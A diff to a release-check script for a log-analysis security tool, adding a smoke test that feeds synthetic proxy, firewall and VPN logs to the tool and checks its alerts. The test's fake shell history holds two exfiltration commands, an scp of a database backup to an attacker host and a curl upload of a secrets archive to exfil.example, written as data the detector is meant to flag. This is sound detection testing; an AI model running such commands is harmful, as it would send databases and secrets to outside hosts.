@@ -108,6 +108,7 @@ def _check_distribution(version: str) -> None:
         _assert("bla/output/geo_map.py" in names, "wheel is missing bla/output/geo_map.py")
         _assert("bla/parsers/shell_history.py" in names, "wheel is missing bla/parsers/shell_history.py")
         _assert("bla/remote/ssh_workspace.py" in names, "wheel is missing bla/remote/ssh_workspace.py")
+        _assert("bla/cli/main.py" in names, "wheel is missing bla/cli/main.py")
         _assert("bla/output/manifest.py" in names, "wheel is missing bla/output/manifest.py")
         _assert("bla_cli.py" in names, "wheel is missing bla_cli.py")
 
@@ -123,6 +124,7 @@ def _check_distribution(version: str) -> None:
             "/bla/output/assets/world-countries.geojson",
             "/bla/output/geo_map.py",
             "/bla/parsers/shell_history.py",
+            "/bla/cli/main.py",
             "/bla_cli.py",
             "/scripts/release_check.py",
             "/sample_logs/auth.log",
@@ -336,6 +338,78 @@ def _run_v142_hardening_smoke() -> None:
                 "v1.4.2 smoke JSON did not keep shell account context")
 
 
+def _run_v143_feature_smoke(version: str) -> None:
+    """Exercise the v1.4.3 JSON controls, Shell exfiltration, and P0 vendor fields."""
+    with tempfile.TemporaryDirectory(prefix="bla-v143-smoke-") as tmp:
+        tmp_path = Path(tmp)
+        input_dir = tmp_path / "input"
+        input_dir.mkdir()
+        (input_dir / "p0_security.log").write_text(
+            "\n".join([
+                "time=2024-03-15T12:00:00 log_type=proxy src_ip=10.0.0.8 user=alice "
+                "request_url=https://download.evil.example/tool.ps1 action=allow",
+                "time=2024-03-15T12:01:00 log_type=proxy src_ip=10.0.0.8 user=alice "
+                "request_url=https://beacon.evil.example/a url_category=Malware threat_category=C2 action=allow",
+                "time=2024-03-15T12:02:00 log_type=firewall src_ip=198.51.100.8 dst_ip=10.0.0.5 "
+                "dst_port=3389 protocol=tcp policy_action=allow",
+                "time=2024-03-15T12:03:00 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
+                "time=2024-03-15T12:03:10 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
+                "time=2024-03-15T12:03:20 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
+                "time=2024-03-15T12:03:30 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
+                "time=2024-03-15T12:03:40 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
+            ]) + "\n",
+            encoding="utf-8",
+        )
+        (input_dir / ".bash_history").write_text(
+            "\n".join([
+                "scp /var/backups/db.sql.gz attacker@203.0.113.10:/tmp/db.sql.gz",
+                "curl --upload-file /tmp/secrets.tar.gz https://exfil.example/upload",
+            ]) + "\n",
+            encoding="utf-8",
+        )
+        out_dir = tmp_path / "report"
+
+        _run([
+            sys.executable,
+            "bla_cli.py",
+            str(input_dir),
+            "--profile",
+            "cn-hvv",
+            "--out",
+            str(out_dir),
+            "--json-events-limit",
+            "2",
+            "--raw-line-limit",
+            "32",
+            "--exit-on",
+            "none",
+            "--no-color",
+            "--max-alerts",
+            "10",
+        ])
+
+        html = (out_dir / "index.html").read_text(encoding="utf-8")
+        report = json.loads((out_dir / "report.json").read_text(encoding="utf-8"))
+        manifest = json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))
+        alert_ids = {item.get("rule_id") for item in report.get("alerts", [])}
+        report_text = json.dumps(report, ensure_ascii=False)
+
+        _assert(report.get("meta", {}).get("version") == version, "v1.4.3 smoke JSON version mismatch")
+        _assert("EXFIL-001" in alert_ids, "v1.4.3 smoke did not detect shell data exfiltration")
+        _assert("P0-C2-001" in alert_ids, "v1.4.3 smoke did not promote proxy vendor URL/category fields")
+        _assert("BRUTE-001" in alert_ids, "v1.4.3 smoke did not promote VPN auth_result failures")
+        _assert("P0-FW-001" in alert_ids, "v1.4.3 smoke did not promote firewall policy_action allow")
+        _assert("Shell 数据外传命令" in html, "v1.4.3 smoke HTML did not render shell exfiltration alert")
+        _assert("download.evil.example" in report_text, "v1.4.3 smoke did not preserve proxy request_url target")
+        _assert(report.get("truncation", {}).get("events", {}).get("returned") == 2,
+                "v1.4.3 smoke JSON event limit was not applied")
+        _assert(report.get("truncation", {}).get("events", {}).get("truncated") is True,
+                "v1.4.3 smoke JSON event truncation metadata missing")
+        _assert(all(len(item.get("raw_line", "")) <= 32 for item in report.get("events", [])),
+                "v1.4.3 smoke raw_line limit was not applied")
+        _assert(manifest.get("inputs"), "v1.4.3 smoke manifest did not record inputs")
+
+
 def main() -> int:
     parser = argparse.ArgumentParser(description="Run BLA's local release safety checks.")
     parser.add_argument("--build", action="store_true", help="build and inspect wheel/sdist artifacts")
@@ -359,6 +433,7 @@ def main() -> int:
     _run_sample_smokes()
     _run_v141_feature_smoke()
     _run_v142_hardening_smoke()
+    _run_v143_feature_smoke(version)
 
     if args.build:
         _check_distribution(version)
